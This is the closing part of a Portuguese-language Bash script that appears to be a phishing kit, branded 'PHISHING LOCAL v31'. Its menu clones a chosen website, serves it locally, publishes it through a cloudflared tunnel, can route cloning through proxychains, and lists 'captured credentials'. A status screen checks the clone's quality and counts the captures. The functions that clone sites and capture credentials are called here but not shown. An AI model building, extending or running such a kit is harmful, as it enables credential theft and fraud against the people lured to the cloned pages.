        echo -e "${YELLOW}  Túnel rodando mas link não capturado ainda.${NC}"
        echo -e "${YELLOW}  Verifique: cat $SCRIPT_DIR/.tunnel.log${NC}"
    fi

    echo ""
    echo -e "${YELLOW}1) Recriar túnel${NC}"
    echo -e "${YELLOW}Enter) Voltar${NC}"
    echo -n "> "
    read CHOICE

    if [ "$CHOICE" = "1" ]; then
        start_tunnel
    fi
}
show_status() {
    clear
    echo -e "  ═══ 📊 STATUS DO SISTEMA ═══"
    echo ""

    # Node.js
    echo -n "  ${YELLOW}Node.js:${NC}         "
    if command -v node &>/dev/null; then
        echo -e "${GREEN}✓ $(node --version 2>/dev/null)${NC}"
    else
        echo -e "${RED}✗ Não instalado${NC}"
    fi

    # curl
    echo -n "  ${YELLOW}Curl:${NC}            "
    if command -v curl &>/dev/null; then
        echo -e "${GREEN}✓${NC}"
    else
        echo -e "${RED}✗${NC}"
    fi

    # Proxychains
    echo -n "  ${YELLOW}ProxyChains:${NC}      "
    if command -v proxychains4 &>/dev/null; then
        echo -e "${GREEN}✓${NC}"
    else
        echo -e "${YELLOW}○ Não instalado (opcional)${NC}"
    fi

    # Cloudflared
    echo -n "  ${YELLOW}Cloudflared:${NC}      "
    if command -v cloudflared &>/dev/null; then
        echo -e "${GREEN}✓${NC}"
    else
        echo -e "${RED}✗ Não instalado (opcional)${NC}"
    fi

    # grep -oE
    echo -n "  ${YELLOW}Grep -oE:${NC}        "
    if echo "test" | grep -qe "test" 2>/dev/null; then
        echo -e "${GREEN}✓${NC}"
    else
        echo -e "${RED}✗ (problema!)${NC}"
    fi

    echo ""
    echo -e "  ${PURPLE}──── Site Clonado ────${NC}"

    # Diagnóstico do site atual
    local site_dir="$SITE_DIR"
    if [ -d "$site_dir" ] && [ -f "$site_dir/index.html" ]; then
        local html_size=$(wc -c < "$site_dir/index.html" 2>/dev/null | tr -d ' ')
        local css_count=$(ls "$site_dir"/css_*.css 2>/dev/null | wc -l)
        local js_count=$(ls "$site_dir"/js_*.js 2>/dev/null | wc -l)
        local asset_count=$(ls "$site_dir"/asset_* 2>/dev/null | wc -l)
        local total=$((html_size))
        [ "$css_count" -gt 0 ] && total=$((total + $(wc -c "$site_dir"/css_*.css 2>/dev/null | tail -1 | awk '{print $1}')))
        echo -e "  ${YELLOW}HTML:${NC}             ${WHITE}${html_size} bytes${NC}"

        # Detectar SPA (Angular/React/Vue)
        local is_spa=0
        local spa_type=""
        grep -qi 'app-root\|_nghost\|__NEXT_DATA__\|data-reactroot\|ng-version\|vue-router' "$site_dir/index.html" 2>/dev/null && is_spa=1
        grep -qi 'app-root\|_nghost\|ng-version' "$site_dir/index.html" 2>/dev/null && spa_type="Angular"
        grep -qi '__NEXT_DATA__\|__next' "$site_dir/index.html" 2>/dev/null && spa_type="Next.js"
        grep -qi 'data-reactroot\|react' "$site_dir/index.html" 2>/dev/null && spa_type="React"
        grep -qi 'vue-router\|vue.js\|vue.min' "$site_dir/index.html" 2>/dev/null && spa_type="Vue.js"

        if [ "$is_spa" = "1" ]; then
            echo -e "  ${RED}⚠ SPA detectado: ${spa_type}${NC}"
            echo -e "  ${RED}  → Site é 100% JS renderizado no browser${NC}"
            echo -e "  ${RED}  → Clone real NÃO é possível${NC}"
            echo -e "  ${YELLOW}  → Use '1) PHISH' pra testar outro site${NC}"
        else
            echo -n "  ${YELLOW}Status:${NC}           "
            if [ "$html_size" -lt 3000 ]; then
                echo -e "${RED}⚠ HTML muito pequeno (site pode ter bloqueio)${NC}"
            elif [ "$css_count" -eq 0 ]; then
                echo -e "${YELLOW}⚠ Sem CSS (pode ficar sem estilo)${NC}"
            elif [ "$js_count" -eq 0 ]; then
                echo -e "${YELLOW}⚠ Sem JS (estático OK)${NC}"
            else
                echo -e "${GREEN}✓ Completo${NC}"
            fi
        fi

        echo -e "  ${YELLOW}CSS files:${NC}        ${WHITE}${css_count}${NC}"
        echo -e "  ${YELLOW}JS files:${NC}         ${WHITE}${js_count}${NC}"
        echo -e "  ${YELLOW}Assets:${NC}           ${WHITE}${asset_count}${NC}"

        # Verificar se HTML faz referência a CDN externa
        local ext_links=$(grep -oE '(src|href)="https?://[^"]*"' "$site_dir/index.html" 2>/dev/null | grep -v 'localhost' | wc -l)
        if [ "$ext_links" -gt 0 ]; then
            echo -e "  ${RED}⚠ Links externos:    ${ext_links} (não substituídos!)${NC}"
        fi
    else
        echo -e "  ${YELLOW}Site:${NC}             ${RED}Nenhum clone atual${NC}"
    fi

    echo ""
    echo -e "  ${PURPLE}──── Processos ────${NC}"

    # Servidor
    echo -n "  ${YELLOW}Servidor:${NC}         "
    local alive=0
    if [ -f "$SCRIPT_DIR/.server.pid" ]; then
        local pid=$(cat "$SCRIPT_DIR/.server.pid")
        if kill -0 "$pid" 2>/dev/null; then
            echo -e "${GREEN}✓ Rodando (PID: $pid)${NC}"
            alive=1
        else
            echo -e "${RED}✗ PID $pid parou${NC}"
        fi
    fi
    if [ "$alive" = "0" ]; then
        local node_pids=$(pgrep -f "node.*server" 2>/dev/null)
        if [ -n "$node_pids" ]; then
            echo -e "${GREEN}    → Node vivo: $node_pids (sem PID file)${NC}"
        else
            echo -e "${RED}✗ Desligado${NC}"
        fi
    fi

    # Túnel
    echo -n "  ${YELLOW}Túnel:${NC}            "
    local tun_alive=0
    if [ -f "$SCRIPT_DIR/.tunnel.pid" ]; then
        local pid=$(cat "$SCRIPT_DIR/.tunnel.pid")
        if kill -0 "$pid" 2>/dev/null; then
            echo -e "${GREEN}✓ Rodando (PID: $pid)${NC}"
            tun_alive=1
        else
            echo -e "${RED}✗ PID $pid parou${NC}"
        fi
    fi
    if [ "$tun_alive" = "0" ] && pgrep -f cloudflared >/dev/null 2>&1; then
        echo -e "${GREEN}    → Cloudflared vivo (sem PID)${NC}"
    elif [ "$tun_alive" = "0" ]; then
        echo -e "${YELLOW}○ Desligado${NC}"
    fi

    local cap_count=0
    if [ -f "$LOG_FILE" ]; then
        cap_count=$(wc -l < "$LOG_FILE" 2>/dev/null)
    fi
    echo ""
    echo -e "  ${YELLOW}Capturas:${NC}        ${WHITE}$cap_count${NC}"

    echo ""
    echo -e "  ${PURPLE}──── Arquivos ────${NC}"

    if [ -f "$SCRIPT_DIR/server/server.js" ]; then
        local js_size=$(wc -c < "$SCRIPT_DIR/server/server.js" 2>/dev/null | tr -d ' ')
        echo -e "    ${GREEN}✓${NC} server/server.js (${js_size} bytes)"
    else
        echo -e "    ${RED}✗${NC} server/server.js"
    fi

    if [ -d "$CAPTURED_DIR" ]; then
        local site_count=$(ls -d "$CAPTURED_DIR"/*/ 2>/dev/null | wc -l)
        echo -e "  ${YELLOW}Sites salvos:${NC}    ${WHITE}$site_count${NC}"
    fi

    echo ""
    echo -e "  ${PURPLE}──── Logs ────${NC}"

    if [ -f "$SCRIPT_DIR/server.log" ]; then
        local log_size=$(wc -c < "$SCRIPT_DIR/server.log" 2>/dev/null | tr -d ' ')
        local last_line=$(tail -1 "$SCRIPT_DIR/server.log" 2>/dev/null)
        echo -e "  ${YELLOW}Server.log:${NC}      ${log_size} bytes"
        echo -e "    → ${last_line}"
    else
        echo -e "  ${YELLOW}Server.log:${NC}      ${RED}não existe${NC}"
    fi

    if [ -f "$SCRIPT_DIR/curl.log" ]; then
        local log_size=$(wc -c < "$SCRIPT_DIR/curl.log" 2>/dev/null | tr -d ' ')
        local last_line=$(tail -1 "$SCRIPT_DIR/curl.log" 2>/dev/null)
        echo -e "  ${YELLOW}Curl.log:${NC}        ${log_size} bytes"
        echo -e "    → ${last_line}"
    else
        echo -e "  ${YELLOW}Curl.log:${NC}        ${RED}não existe${NC}"
    fi

    if [ -f "$SCRIPT_DIR/.tunnel.log" ]; then
        local log_size=$(wc -c < "$SCRIPT_DIR/.tunnel.log" 2>/dev/null | tr -d ' ')
        local last_line=$(tail -1 "$SCRIPT_DIR/.tunnel.log" 2>/dev/null)
        echo -e "  ${YELLOW}Tunnel.log:${NC}      ${log_size} bytes"
        echo -e "    → ${last_line}"
    fi

    echo ""
    echo -e "${YELLOW}Enter...${NC}"
    read
}

stop_all() {
    if [ -f "$SCRIPT_DIR/.server.pid" ]; then
        local pid=$(cat "$SCRIPT_DIR/.server.pid")
        kill "$pid" 2>/dev/null
        rm -f "$SCRIPT_DIR/.server.pid"
    fi
    if [ -f "$SCRIPT_DIR/.tunnel.pid" ]; then
        local pid=$(cat "$SCRIPT_DIR/.tunnel.pid")
        kill "$pid" 2>/dev/null
        rm -f "$SCRIPT_DIR/.tunnel.pid"
    fi
    pkill -f "node.*server.js" 2>/dev/null
    pkill -f cloudflared 2>/dev/null
    echo -e "${GREEN}[✓] Tudo parado.${NC}"
}


# =============================================
# PROXY CLONE
# =============================================
do_proxy_clone() {
    clear
    echo -e "\033[1;36m═══ PROXY CLONE ═══\033[0m"
    echo ""

    # Verificar proxychains
    local proxychains_conf=""
    if [ -f "$HOME/.proxychains/proxychains.conf" ]; then
        proxychains_conf="$HOME/.proxychains/proxychains.conf"
    elif [ -f "/data/data/com.termux/files/home/.proxychains/proxychains.conf" ]; then
        proxychains_conf="/data/data/com.termux/files/home/.proxychains/proxychains.conf"
    fi

    if [ -z "$proxychains_conf" ] || ! command -v proxychains4 &>/dev/null; then
        echo -e "${RED}  proxychains4 não encontrado ou sem config!${NC}"
        echo -e "${YELLOW}  Instale: pkg install proxychains-ng${NC}"
        echo -e "${YELLOW}  Configure: ~/.proxychains/proxychains.conf${NC}"
        echo ""
        echo -e "${YELLOW}Enter...${NC}"
        read
        return
    fi

    echo -e "${GREEN}  ✓ ProxyChains ATIVO → $proxychains_conf${NC}"
    echo ""
    echo -e "${YELLOW}URL do site:${NC} "
    read URL
    [ -z "$URL" ] && return
    echo "$URL" | grep -q "^http" || URL="https://$URL"

    echo -e "${YELLOW}Redirect (Enter = mesma):${NC} "
    read REDIR
    [ -z "$REDIR" ] && REDIR="$URL"
    echo "$REDIR" | grep -q "^http" || REDIR="https://$REDIR"

    echo -e "${YELLOW}Porta (Enter = 8080):${NC} "
    read PT
    [ -z "$PT" ] && PT=8080

    # Exportar proxychains pra clone_site usar
    export PROXY_CHAINS_CONF="$proxychains_conf"
    clone_site "$URL" "$REDIR" "$PT"
    unset PROXY_CHAINS_CONF
}

# =============================================
# MENU
# =============================================
while true; do
    clear
    echo -e "  ██████╗ ██╗  ██╗██╗███████╗██╗  ██╗"
    echo -e "  ██╔══██╗██║  ██║██║██╔════╝██║  ██║"
    echo -e "  ███████║███████║██║███████╗███████║"
    echo -e "  ██╔═══╝ ██╔══██║██║╚════██║██╔══██║"
    echo -e "  ██║     ██║  ██║██║███████║██║  ██║"
    echo -e "  ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝"
    echo ""
    echo -e "  🎣 PHISHING LOCAL \033[1;36mv31\033[0m — Clonador Profissional"
    echo ""
    echo "  ─────────────────────────────────────────"
    echo ""
    echo -e "  🎣 1) PHISH      - Clonar e iniciar servidor"
    echo -e "  📋 2) CAPTURAS  - Ver credenciais capturadas"
    echo -e "  🌐 3) TÚNEL     - Criar URL pública (cloudflared)"
    echo -e "  📜 4) HISTÓRICO - Reusar clones anteriores"
    echo -e "  📍 5) LOCALHOST - Ver IP e porta"
    echo -e "  🔗 6) LINK      - Ver link do túnel ativo"
    echo -e "  📊 7) STATUS    - Ver tudo do sistema"
    echo -e "  🛑 8) PARAR     - Desligar tudo"
    if [ -n "$proxychains_conf" ]; then
        echo -e "${GREEN}  🔓 9) PROXY     - Clonar com proxychains (ATIVO)${NC}"
    else
        echo -e "  🔒 9) PROXY     - Clonar com proxychains"
    fi
    echo ""
    echo -e "  ❌ 0) SAIR"
    echo ""
    echo -e "  \033[1;36mEscolha: \033[0m"
    read OP

    case $OP in
        1)
            clear
            echo -e "\033[1;36m═══ PHISH ═══\033[0m"
            echo ""
            echo -e "${YELLOW}URL do site:${NC} "
            read URL
            [ -z "$URL" ] && continue
            echo "$URL" | grep -q "^http" || URL="https://$URL"

            echo -e "${YELLOW}Redirect (Enter = mesma):${NC} "
            read REDIR
            [ -z "$REDIR" ] && REDIR="$URL"
            echo "$REDIR" | grep -q "^http" || REDIR="https://$REDIR"

            echo -e "${YELLOW}Porta (Enter = 8080):${NC} "
            read PT
            [ -z "$PT" ] && PT=8080

            clone_site "$URL" "$REDIR" "$PT"
            ;;
        2)
            view_captures
            ;;
        3)
            start_tunnel
            ;;
        4)
            show_history
            ;;
        5)
            show_localhost
            ;;
        6)
            show_tunnel_link
            ;;
        7)
            show_status
            ;;
        8)
            stop_all
            echo ""
            echo -e "${YELLOW}Enter...${NC}"
            read
            ;;
        9)
            do_proxy_clone
            ;;
        0)
            stop_all
            exit 0
            ;;
        *)
            echo -e "${RED}Inválido!${NC}"
            ;;
    esac
done
